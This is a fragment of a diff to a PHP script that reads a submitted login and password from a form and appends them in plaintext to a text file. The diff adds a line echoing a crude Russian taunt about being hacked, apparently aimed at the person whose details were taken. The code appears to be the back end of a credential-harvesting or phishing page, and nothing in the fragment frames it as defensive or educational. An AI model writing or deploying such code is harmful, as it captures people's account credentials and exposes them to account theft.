@@ -4,4 +4,5 @@ $password = $_POST['password'];
 $file = fopen("file.txt","a+");
 fwrite($file,"\n $login:$password \n");
 fclose($file);
+echo "Спасибо за взлом очка";
 ?>
